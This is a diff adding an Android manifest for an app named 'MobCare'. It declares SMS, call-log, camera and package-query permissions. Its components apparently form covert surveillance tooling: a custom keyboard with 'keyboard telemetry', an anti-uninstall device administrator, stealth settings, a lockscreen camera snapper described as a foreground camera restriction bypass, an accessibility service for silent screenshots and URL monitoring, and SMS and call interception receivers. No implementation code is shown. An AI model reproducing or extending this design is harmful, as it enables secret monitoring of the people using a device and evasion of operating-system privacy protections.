@@ -1,0 +1,231 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" xmlns:tools="http://schemas.android.com/tools" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MobCare">
+
+        <!-- Custom Gboard Canvas Keyboard (InputMethodService) -->
+        <service
+            android:name=".keyboard.service.MobCareKeyboardService"
+            android:label="@string/ime_name"
+            android:permission="android.permission.BIND_INPUT_METHOD"
+            android:directBootAware="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.view.InputMethod" />
+            </intent-filter>
+            <meta-data
+                android:name="android.view.im"
+                android:resource="@xml/method" />
+        </service>
+
+        <!-- App Install & Removal Guardian Broadcast Receiver -->
+        <receiver
+            android:name=".audit.PackageMonitorReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Anti-Uninstall Device Administrator Receiver -->
+        <receiver
+            android:name=".security.MobCareDeviceAdminReceiver"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Decoy Captcha Honeypot Activity -->
+        <activity
+            android:name=".security.DecoyCaptchaActivity"
+            android:exported="false"
+            android:theme="@style/Theme.MobCare"
+            android:showOnLockScreen="true"
+            android:screenOrientation="portrait" />
+
+        <!-- Master Hub Activity -->
+        <activity
+            android:name=".dashboard.MainActivity"
+            android:windowSoftInputMode="stateAlwaysHidden"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Dedicated Feature Activities -->
+        <activity
+            android:name=".dashboard.KeyboardTelemetryActivity"
+            android:windowSoftInputMode="stateAlwaysHidden"
+            android:exported="false" />
+
+        <activity
+            android:name=".dashboard.PackageGuardianActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".dashboard.GalleryActivity"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name=".dashboard.StealthSettingsActivity"
+            android:exported="false" />
+
+        <!-- Notification Vault Listener Service -->
+        <service
+            android:name=".audit.MobCareNotificationListener"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <activity
+            android:name=".dashboard.NotificationVaultActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".dashboard.CloudSyncActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".dashboard.AppTimelineActivity"
+            android:exported="false" />
+
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+
+
+
+        <!-- Lockscreen Trampoline Camera Snapper (Foreground Camera Restriction Bypass) -->
+        <activity
+            android:name=".security.LockscreenTrampolineActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:showOnLockScreen="true"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+        <!-- Post-Unlock Biometric Sentinel (3-Sec Delay Face Snapper & Safe Lockdown) -->
+        <activity
+            android:name=".security.PostUnlockSentinelActivity"
+            android:theme="@style/Theme.MobCare"
+            android:showOnLockScreen="true"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+        <!-- Broadcast Receiver for Phone Unlock (ACTION_USER_PRESENT) -->
+        <receiver
+            android:name=".security.UnlockSentinelReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- App Locker Activities -->
+        <activity
+            android:name=".dashboard.AppLockerActivity"
+            android:exported="false" />
+
+        <activity
+            android:name=".security.AppLockGateActivity"
+            android:theme="@style/Theme.MobCare"
+            android:taskAffinity="com.mobcare.applock"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+        <!-- Call & SMS Vault Activity -->
+        <activity
+            android:name=".dashboard.CallSmsVaultActivity"
+            android:exported="false" />
+
+        <!-- Web Intelligence / Browser Vault Activity -->
+        <activity
+            android:name=".dashboard.BrowserVaultActivity"
+            android:exported="false" />
+
+        <!-- App Locker Watchdog Service -->
+        <service
+            android:name=".security.AppLockerWatchdogService"
+            android:foregroundServiceType="specialUse"
+            android:exported="false">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Application integrity and security sentinel" />
+        </service>
+
+        <!-- Sentinel Accessibility Service for URL Monitoring & Silent Screenshot -->
+        <service
+            android:name=".security.MobCareAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- SMS Vault Receiver -->
+        <receiver
+            android:name=".security.SmsVaultReceiver"
+            android:permission="android.permission.BROADCAST_SMS"
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Call Log Vault Receiver -->
+        <receiver
+            android:name=".security.CallVaultReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
